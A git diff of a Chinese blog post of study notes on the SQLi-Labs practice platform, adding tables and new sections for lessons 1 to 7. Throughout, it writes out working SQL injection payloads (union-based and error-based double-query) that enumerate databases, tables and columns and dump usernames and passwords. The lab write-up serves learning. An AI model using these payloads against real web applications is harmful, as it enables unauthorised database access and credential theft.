@@ -5,10 +5,8 @@
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
     <meta name="keywords" content="SQLi-LABS学习笔记(更新中), 简简,简简博客,简简的博客,信息安全,CTF,渗透测试,Web,网络安全">
-    <meta name="description" content="SQLi-Labs是一个专业的SQL注入练习平台，以前也偶尔练习过一些些关卡，但一直没有系统的练习过，希望这次可以坚持下去吧~~    
-Less-1(GET单引号字符型注入)#查看页面变化，判断sql注入类别
-?id=1 and 1=1
-">
+    <meta name="description" content="SQLi-Labs是一个专业的SQL注入练习平台，以前也偶尔练习过一些些关卡，但一直没有系统的练习全部关卡过，希望这次可以坚持下去吧~~    
+SQLi-LABS闯关游戏下载地址：https://github.com/Audi-1/sql">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -524,21 +522,21 @@ Less-1(GET单引号字符型注入)#查看页面变化，判断sql注入类别
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-07-17
+                    2020-07-18
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.1k
+                    1.5k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    4 分
+                    7 分
                 </div>
                 
 				
@@ -554,16 +552,31 @@ Less-1(GET单引号字符型注入)#查看页面变化，判断sql注入类别
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>SQLi-Labs是一个专业的SQL注入练习平台，以前也偶尔练习过一些些关卡，但一直没有系统的练习过，希望这次可以坚持下去吧~~    </p>
-<h3 id="Less-1-GET单引号字符型注入"><a href="#Less-1-GET单引号字符型注入" class="headerlink" title="Less-1(GET单引号字符型注入)"></a>Less-1(GET单引号字符型注入)</h3><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">#查看页面变化，判断sql注入类别</span>
+                <p>SQLi-Labs是一个专业的SQL注入练习平台，以前也偶尔练习过一些些关卡，但一直没有系统的练习全部关卡过，希望这次可以坚持下去吧~~    </p>
+<p><strong>SQLi-LABS闯关游戏下载地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></strong></p>
+<h3 id="Less-1-GET单引号字符型注入"><a href="#Less-1-GET单引号字符型注入" class="headerlink" title="Less-1(GET单引号字符型注入)"></a>Less-1(GET单引号字符型注入)</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>单引号字符型注入</td>
+<td>id=’$id’</td>
+</tr>
+</tbody></table>
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">#查看页面变化，判断sql注入类别</span>
 ?id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span>
 ?id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span>
 
-<span class="token comment" spellcheck="true">#确定字段数 #不能用#【坑点1】</span>
+<span class="token comment" spellcheck="true">#确定字段数 #不能用#【注意1】</span>
 ?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span> <span class="token comment" spellcheck="true">--+</span>
 ?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">4</span> <span class="token operator">%</span><span class="token number">23</span>
 
-<span class="token comment" spellcheck="true">#联合查询查看显示位 #id要为负数【坑点2】</span>
+<span class="token comment" spellcheck="true">#联合查询查看显示位 #id要为负数【注意2】</span>
 ?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token comment" spellcheck="true">--+</span>
 
 <span class="token comment" spellcheck="true">#爆库【security】</span>
@@ -578,10 +591,24 @@ Less-1(GET单引号字符型注入)#查看页面变化，判断sql注入类别
 
 <span class="token comment" spellcheck="true">#爆值【DumbDumb...】</span>
 ?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users <span class="token comment" spellcheck="true">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><strong>坑点1：</strong>URL框中的sql语句中不能用直接使用<code>#</code>号，要用<code>--+</code>(等价于–空格)或者<code>%23</code>，但是输入框中可以用<code>#</code>，应为输入框提交是会执行一次URL编码，<code>#</code>会被编译成<code>%23</code><br>原因是url中<code>#</code>号是用来指导浏览器动作的（例如锚点），对服务器端完全无用。所以，HTTP请求中不包括<code>#</code><br>将#号改成url的编码<code>%23</code>或者使用<code>--+</code>就可以了</p>
-<p><strong>坑点2：</strong>在联合查询查看显示位，使用union联合查询后发现页面返回的数据没变，这是因为如果左边的SQL语句正确执行那么就会只返回左边第一个查询语句的运行结果，那么我们只要让第一行查询的结果是空集（即union左边的select子句查询结果为空），那么我们union右边的查询结果自然就成为了第一行，就打印在网页上了。</p>
-<p>这个id传递的是数字，而且一般都是从1开始自增的，我们可以把id值设为非正数（负数或0），浮点数，字符型或字符串都行，主要是使左边的查询语句报错就行。</p>
-<h3 id="Less-2-GET数字型注入"><a href="#Less-2-GET数字型注入" class="headerlink" title="Less-2(GET数字型注入)"></a>Less-2(GET数字型注入)</h3><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">#查看页面变化，判断sql注入类别</span>
+<p><strong>注意1：</strong>URL框中的sql语句中不能用直接使用<code>#</code>号，要用<code>--+</code>(等价于–空格)或者<code>%23</code>，但是输入框中可以用<code>#</code>，应为输入框提交是会执行一次URL编码，<code>#</code>会被编译成<code>%23</code><br>原因是url中<code>#</code>号是用来指导浏览器动作的（例如锚点），对服务器端完全无用。所以，HTTP请求中不包括<code>#</code><br>将#号改成url的编码<code>%23</code>或者使用<code>--+</code>就可以了</p>
+<p><strong>注意2：</strong>在联合查询查看显示位，使用union联合查询后发现页面返回的数据没变，这是因为如果左边的SQL语句正确执行那么就会只返回左边第一个查询语句的运行结果，那么我们只要让第一行查询的结果是<code>空集</code>（即union左边的select子句查询结果为空），那么我们union右边的查询结果自然就成为了第一行，就打印在网页上了。</p>
+<p>这个id传递的是数字，而且一般都是从1开始自增的，我们可以把id值设为<code>非正数</code>（负数或0），浮点数，字符型或字符串都行，主要是使左边的查询语句报错就行。</p>
+<h3 id="Less-2-GET数字型注入"><a href="#Less-2-GET数字型注入" class="headerlink" title="Less-2(GET数字型注入)"></a>Less-2(GET数字型注入)</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>数字型注入</td>
+<td>id=$id</td>
+</tr>
+</tbody></table>
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">#查看页面变化，判断sql注入类别</span>
 ?id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span>
 ?id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span>
 
@@ -604,7 +631,21 @@ Less-1(GET单引号字符型注入)#查看页面变化，判断sql注入类别
 
 <span class="token comment" spellcheck="true">#爆值</span>
 ?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="Less-3-GET单引号变形字符型注入"><a href="#Less-3-GET单引号变形字符型注入" class="headerlink" title="Less-3(GET单引号变形字符型注入)"></a>Less-3(GET单引号变形字符型注入)</h3><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">#查看页面变化，判断sql注入类别</span>
+<h3 id="Less-3-GET单引号变形字符型注入"><a href="#Less-3-GET单引号变形字符型注入" class="headerlink" title="Less-3(GET单引号变形字符型注入)"></a>Less-3(GET单引号变形字符型注入)</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>单引号变形字符型注入</td>
+<td>id=(‘$id’)</td>
+</tr>
+</tbody></table>
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">#查看页面变化，判断sql注入类别</span>
 ?id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span>
 ?id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span>
 ?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span> <span class="token comment" spellcheck="true">--+</span>
@@ -630,7 +671,21 @@ Less-1(GET单引号字符型注入)#查看页面变化，判断sql注入类别
 
 <span class="token comment" spellcheck="true">#爆值</span>
 ?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>'<span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users <span class="token comment" spellcheck="true">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="Less-4-GET双引号字符型注入"><a href="#Less-4-GET双引号字符型注入" class="headerlink" title="Less-4(GET双引号字符型注入)"></a>Less-4(GET双引号字符型注入)</h3><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">#查看页面变化，判断sql注入类别</span>
+<h3 id="Less-4-GET双引号字符型注入"><a href="#Less-4-GET双引号字符型注入" class="headerlink" title="Less-4(GET双引号字符型注入)"></a>Less-4(GET双引号字符型注入)</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>双引号字符型注入</td>
+<td>id=”$id”</td>
+</tr>
+</tbody></table>
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">#查看页面变化，判断sql注入类别</span>
 ?id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span>
 ?id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span>
 ?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">4</span> <span class="token comment" spellcheck="true">--+</span>
@@ -658,7 +713,73 @@ Less-1(GET单引号字符型注入)#查看页面变化，判断sql注入类别
 
 <span class="token comment" spellcheck="true">#爆值</span>
 ?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>"<span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users <span class="token comment" spellcheck="true">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="Less-5-双注入2GET单引号字符型注入"><a href="#Less-5-双注入2GET单引号字符型注入" class="headerlink" title="Less-5(双注入2GET单引号字符型注入)"></a>Less-5(双注入2GET单引号字符型注入)</h3><h2 id="赞助💰"><a href="#赞助💰" class="headerlink" title="赞助💰"></a>赞助💰</h2><p>如果你觉得对你有帮助，你可以请我喝一杯冰可乐！嘻嘻🤭</p>
+<h3 id="Less-5-GET单引号字符型双查询注入"><a href="#Less-5-GET单引号字符型双查询注入" class="headerlink" title="Less-5(GET单引号字符型双查询注入)"></a>Less-5(GET单引号字符型双查询注入)</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>单引号字符型双查询注入</td>
+<td>id=’$id’</td>
+</tr>
+</tbody></table>
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">#查看页面变化，判断sql注入类别</span>
+?id<span class="token operator">=</span><span class="token number">1</span>
+?id<span class="token operator">=</span><span class="token number">1</span>'
+
+<span class="token comment" spellcheck="true">#确定字段数</span>
+?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span> <span class="token comment" spellcheck="true">--+</span>
+?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">4</span> <span class="token comment" spellcheck="true">--+</span>
+
+<span class="token comment" spellcheck="true">#联合查询查看显示位</span>
+?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token comment" spellcheck="true">--+</span>
+
+<span class="token comment" spellcheck="true">#爆库【Duplicate entry 'security-1' for key ''】</span>
+?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,count(*),concat_ws('</span><span class="token operator">-</span>'<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token number">a</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> <span class="token number">a</span><span class="token comment" spellcheck="true">--+</span>
+
+<span class="token comment" spellcheck="true">#爆表【Duplicate entry 'emails,referers,uagents,users-0' for key ''】</span>
+?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,count(*),concat_ws('</span><span class="token operator">-</span>'<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">as</span> <span class="token number">a</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> <span class="token number">a</span><span class="token comment" spellcheck="true">--+</span>
+
+<span class="token comment" spellcheck="true">#爆列【Duplicate entry '...,id,username,password,' for key ''】</span>
+?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,count(*),concat_ws('</span><span class="token operator">-</span><span class="token string">',(select group_concat(column_name) from information_schema.columns where table_name='</span>users'<span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">as</span> <span class="token number">a</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> <span class="token number">a</span><span class="token comment" spellcheck="true">--+</span>
+
+<span class="token comment" spellcheck="true">#爆值【Duplicate entry '1*Dumb*Dumb-1' for key ''】</span>
+?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,count(*),concat_ws('</span><span class="token operator">-</span><span class="token string">',(select concat_ws('</span><span class="token operator">*</span>'<span class="token punctuation">,</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">as</span> <span class="token number">a</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> <span class="token number">a</span><span class="token comment" spellcheck="true">--+</span>
+<span class="token comment" spellcheck="true">#注意：因为这里查询结果只能一行，所以不能用group_concat()，使用group_concat()查询结果超过一行，可以修改limit的范围来遍历用户信息。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="Less-6-GET双引号字符型双查询注入"><a href="#Less-6-GET双引号字符型双查询注入" class="headerlink" title="Less-6(GET双引号字符型双查询注入)"></a>Less-6(GET双引号字符型双查询注入)</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>双引号字符型双查询注入</td>
+<td>id=”$id”</td>
+</tr>
+</tbody></table>
+<p>和 Less-5 差别只在于单双引号，可用Less-5方法进行注入，这里不再赘述。</p>
+<h3 id="Less-7-GET导出文件字符型注入"><a href="#Less-7-GET导出文件字符型注入" class="headerlink" title="Less-7(GET导出文件字符型注入)"></a>Less-7(GET导出文件字符型注入)</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>导出文件字符型注入</td>
+<td>id=(‘$id’)</td>
+</tr>
+</tbody></table>
+<h2 id="赞助💰"><a href="#赞助💰" class="headerlink" title="赞助💰"></a>赞助💰</h2><p>如果你觉得对你有帮助，你可以请我喝一杯冰可乐！嘻嘻🤭</p>
 <table>
   <tbody>
      <tr>
@@ -1187,10 +1308,8 @@ Less-1(GET单引号字符型注入)#查看页面变化，判断sql注入类别
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            SQLi-Labs是一个专业的SQL注入练习平台，以前也偶尔练习过一些些关卡，但一直没有系统的练习过，希望这次可以坚持下去吧~~    
-Less-1(GET单引号字符型注入)#查看页面变化，判断sql注入类别
-?id=1 and 1=1
-
+                            SQLi-Labs是一个专业的SQL注入练习平台，以前也偶尔练习过一些些关卡，但一直没有系统的练习全部关卡过，希望这次可以坚持下去吧~~    
+SQLi-LABS闯关游戏下载地址：https://github.com/Audi-1/sql
                         
                     </div>
                     <div class="publish-info">
@@ -1455,7 +1574,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">165.8k</span>&nbsp;字
+                class="white-color">167.5k</span>&nbsp;字
             
             
             
